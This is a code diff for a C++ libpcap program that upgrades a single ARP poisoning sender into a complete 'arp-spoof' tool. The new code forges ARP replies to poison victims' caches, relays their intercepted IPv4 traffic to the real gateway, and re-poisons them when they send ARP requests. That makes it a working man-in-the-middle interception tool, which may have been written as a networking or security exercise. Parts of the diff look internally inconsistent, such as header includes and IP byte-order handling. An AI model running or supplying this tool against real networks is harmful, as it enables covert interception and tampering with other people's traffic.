@@ -1,7 +1,7 @@
 #include <cstdio>
 #include <cstdlib>
 #include <cstring>
-#include <string>
+#include <vector>
 #include <pcap.h>
 #include <unistd.h>
 #include <sys/ioctl.h>
@@ -10,6 +10,8 @@
 
 #include "ethhdr.h"
 #include "arphdr.h"
+#include "ip.h"
+#include "mac.h"
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -20,203 +22,205 @@ struct EthArpPacket final {
 
 struct Interface {
     Mac mac;
-    Ip ip;
+    Ip  ip;
 };
 
-void usage() {
-    printf(
-        "syntax: send-arp <interface> <sender ip> <target ip> "
-        "[<sender ip 2> <target ip 2> ...]\n"
-        "sample: send-arp eth0 192.168.10.2 192.168.10.1\n"
-    );
-}
+Interface getInterface(const char* ifname) {
+    Interface me{};
 
-Interface getInterface(const char* dev) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd < 0) {
-        perror("socket");
-        exit(EXIT_FAILURE);
+        perror("socket()");
+        exit(1);
     }
 
-    ifreq ifr{};
-    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
+    struct ifreq ifr;
+    memset(&ifr, 0, sizeof(ifr));
+    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
 
+    // MAC
     if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
-        perror("SIOCGIFHWADDR");
-        close(fd);
-        exit(EXIT_FAILURE);
+        perror("ioctl(SIOCGIFHWADDR)");
+        exit(1);
     }
+    me.mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
 
-    Mac mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
-
+    // IP
     if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
-        perror("SIOCGIFADDR");
-        close(fd);
-        exit(EXIT_FAILURE);
+        perror("ioctl(SIOCGIFADDR)");
+        exit(1);
     }
-
-    auto* addr = reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr);
-    Ip ip(ntohl(addr->sin_addr.s_addr));
+    me.ip = Ip(reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr)->sin_addr.s_addr);
 
     close(fd);
-    return {mac, ip};
+    return me;
 }
 
-EthArpPacket makePacket(
-    const Mac& dmac,
-    const Mac& smac,
-    uint16_t op,
-    const Ip& sip,
-    const Mac& tmac,
-    const Ip& tip
-) {
-    EthArpPacket packet{};
+struct Session {
+    Ip  senderIp;
+    Mac senderMac;
+    Ip  targetIp;
+    Mac targetMac;
+};
 
-    packet.eth_.dmac_ = dmac;
-    packet.eth_.smac_ = smac;
-    packet.eth_.type_ = htons(EthHdr::Arp);
+EthArpPacket makePacket(const Mac& dmac, const Mac& smac,
+                        uint16_t op,
+                        const Ip&  sip,  const Mac& smac_arp,
+                        const Ip&  tip,  const Mac& dmac_arp) {
+    EthArpPacket p{};
+    p.eth_.dmac_ = dmac;
+    p.eth_.smac_ = smac;
+    p.eth_.type_ = htons(EthHdr::Arp);
 
-    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
-    packet.arp_.pro_ = htons(EthHdr::Ip4);
-    packet.arp_.hln_ = Mac::Size;
-    packet.arp_.pln_ = Ip::Size;
-    packet.arp_.op_ = htons(op);
-    packet.arp_.smac_ = smac;
-    packet.arp_.sip_ = htonl(sip);
-    packet.arp_.tmac_ = tmac;
-    packet.arp_.tip_ = htonl(tip);
-
-    return packet;
+    p.arp_.hrd_ = htons(ArpHdr::ETHER);
+    p.arp_.pro_ = htons(EthHdr::Ip4);
+    p.arp_.hln_ = sizeof(Mac);
+    p.arp_.pln_ = sizeof(Ip);
+    p.arp_.op_  = htons(op);
+    p.arp_.smac_ = smac_arp;
+    p.arp_.sip_  = htonl(sip);
+    p.arp_.tmac_ = dmac_arp;
+    p.arp_.tip_  = htonl(tip);
+    return p;
 }
 
-void sendPacket(pcap_t* handle, const EthArpPacket& packet) {
-    int result = pcap_sendpacket(
-        handle,
-        reinterpret_cast<const u_char*>(&packet),
-        sizeof(packet)
-    );
-
-    if (result != 0) {
+void sendPacket(pcap_t* handle, const EthArpPacket& p) {
+    if (pcap_sendpacket(handle,
+                        reinterpret_cast<const u_char*>(&p),
+                        sizeof(EthArpPacket)) != 0) {
         fprintf(stderr, "pcap_sendpacket: %s\n", pcap_geterr(handle));
-        exit(EXIT_FAILURE);
     }
 }
 
-Mac resolveMac(
-    pcap_t* handle,
-    const Interface& me,
-    const Ip& senderIp
-) {
-    EthArpPacket request = makePacket(
-        Mac::broadcastMac(),
-        me.mac,
+Mac resolveMac(pcap_t* handle, const Interface& me, const Ip& targetIp) {
+    EthArpPacket req = makePacket(
+        Mac::broadcastMac(),  me.mac,
         ArpHdr::Request,
-        me.ip,
-        Mac::nullMac(),
-        senderIp
+        me.ip,                me.mac,
+        targetIp,             Mac::nullMac()
     );
-
-    sendPacket(handle, request);
+    sendPacket(handle, req);
 
     while (true) {
-        pcap_pkthdr* header;
-        const u_char* data;
+        struct pcap_pkthdr* header;
+        const u_char*       data;
+        int res = pcap_next_ex(handle, &header, &data);
+        if (res <= 0) continue;
 
-        int result = pcap_next_ex(handle, &header, &data);
+        auto* eth = (EthHdr*)data;
+        if (eth->type_ != htons(EthHdr::Arp)) continue;
 
-        if (result == 0)
-            continue;
+        auto* arp = (ArpHdr*)(data + sizeof(EthHdr));
 
-        if (result < 0) {
-            fprintf(stderr, "pcap_next_ex: %s\n", pcap_geterr(handle));
-            exit(EXIT_FAILURE);
-        }
+        if (arp->op_ != htons(ArpHdr::Reply)) continue;
+        if (Ip(ntohl(arp->sip_)) != targetIp)  continue;
 
-        if (header->caplen < sizeof(EthArpPacket))
-            continue;
-
-        auto* packet =
-            reinterpret_cast<const EthArpPacket*>(data);
-
-        if (packet->eth_.type_ != htons(EthHdr::Arp))
-            continue;
-
-        if (packet->arp_.op_ != htons(ArpHdr::Reply))
-            continue;
-
-        if (static_cast<uint32_t>(packet->arp_.sip_) !=
-            htonl(static_cast<uint32_t>(senderIp)))
-            continue;
-
-        if (static_cast<uint32_t>(packet->arp_.tip_) !=
-            htonl(static_cast<uint32_t>(me.ip)))
-            continue;
-
-        if (packet->arp_.tmac_ != me.mac)
-            continue;
-
-        return packet->arp_.smac_;
+        return arp->smac_;
     }
+}
+
+void infect(pcap_t* handle, const Interface& me, const Session& s) {
+    EthArpPacket inf = makePacket(
+        s.senderMac,          me.mac,
+        ArpHdr::Reply,
+        s.targetIp,           me.mac,
+        s.senderIp,           s.senderMac
+    );
+    sendPacket(handle, inf);
+}
+
+void relayToTarget(pcap_t* handle, const Interface& me,
+                   const Session& s,
+                   const pcap_pkthdr* header, const u_char* data) {
+    std::vector<u_char> packet(data, data + header->caplen);
+    auto* eth = (EthHdr*)packet.data();
+    eth->dmac_ = s.targetMac;
+    eth->smac_ = me.mac;
+
+    if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0) {
+        fprintf(stderr, "relay error: %s\n", pcap_geterr(handle));
+    }
+}
+
+void usage() {
+    printf("syntax : arp-spoof <interface> <sender ip> <target ip> [sender2 target2 ...]\n");
+    printf("sample : arp-spoof eth0 10.0.0.20 10.0.0.1\n");
 }
 
 int main(int argc, char* argv[]) {
-    if (argc < 4 || (argc - 2) % 2 != 0) {
+    if (argc < 4 || ((argc - 2) % 2 != 0)) {
         usage();
-        return EXIT_FAILURE;
+        return -1;
     }
+
+    char* dev = argv[1];
 
     char errbuf[PCAP_ERRBUF_SIZE];
-
-    pcap_t* handle =
-        pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
-
-    if (handle == nullptr) {
-        fprintf(
-            stderr,
-            "pcap_open_live(%s): %s\n",
-            argv[1],
-            errbuf
-        );
-        return EXIT_FAILURE;
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+    if (!handle) {
+        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
+        return -1;
     }
 
-    Interface me = getInterface(argv[1]);
+    Interface me = getInterface(dev);
+    printf("[+] Attacker  IP  : %s\n", std::string(me.ip).c_str());
+    printf("[+] Attacker  MAC : %s\n\n", std::string(me.mac).c_str());
 
-    printf(
-        "attacker: %s / %s\n",
-        std::string(me.ip).c_str(),
-        std::string(me.mac).c_str()
-    );
-
+    std::vector<Session> sessions;
     for (int i = 2; i < argc; i += 2) {
         Ip senderIp(argv[i]);
         Ip targetIp(argv[i + 1]);
 
-        printf("[*] resolving %s\n", argv[i]);
+        Mac senderMac = resolveMac(handle, me, senderIp);
+        Mac targetMac = resolveMac(handle, me, targetIp);
 
-        Mac senderMac =
-            resolveMac(handle, me, senderIp);
+        printf("[+] %s (%s)  ⇒  %s (%s)\n",
+               std::string(senderIp).c_str(), std::string(senderMac).c_str(),
+               std::string(targetIp).c_str(), std::string(targetMac).c_str());
 
-        EthArpPacket infection = makePacket(
-            senderMac,         // Ethernet destination
-            me.mac,            // Ethernet source
-            ArpHdr::Reply,
-            targetIp,          // "Target IP is..."
-            senderMac,
-            senderIp
-        );
+        sessions.push_back({senderIp, senderMac, targetIp, targetMac});
+    }
+    puts("");
 
-        sendPacket(handle, infection);
+    for (const Session& s : sessions) infect(handle, me, s);
+    puts("[*] Infection packets sent.  Entering relay loop...\n");
 
-        printf(
-            "[+] infected: %s(%s) <- %s is-at %s\n",
-            argv[i],
-            std::string(senderMac).c_str(),
-            argv[i + 1],
-            std::string(me.mac).c_str()
-        );
+    while (true) {
+        struct pcap_pkthdr* header;
+        const u_char*       data;
+        int res = pcap_next_ex(handle, &header, &data);
+        if (res == 0) continue;   // timeout
+        if (res < 0) break;       // error / EOF
+
+        auto* eth = (EthHdr*)data;
+
+        if (eth->type_ == htons(EthHdr::Ip4)) {
+            for (const Session& s : sessions) {
+                if (eth->smac_ == s.senderMac && eth->dmac_ == me.mac) {
+                    relayToTarget(handle, me, s, header, data);
+                    break;
+                }
+            }
+            continue;
+        }
+
+        if (eth->type_ == htons(EthHdr::Arp)) {
+            auto* arp = (ArpHdr*)(data + sizeof(EthHdr));
+
+            if (arp->op_ != htons(ArpHdr::Request)) continue;
+
+            Ip  tip = Ip(ntohl(arp->tip_));
+            Mac smac = arp->smac_;
+
+            for (const Session& s : sessions) {
+                if (tip == s.targetIp && smac == s.senderMac) {
+                    infect(handle, me, s);   
+                    break;
+                }
+            }
+        }
     }
 
     pcap_close(handle);
-    return EXIT_SUCCESS;
+    return 0;
 }
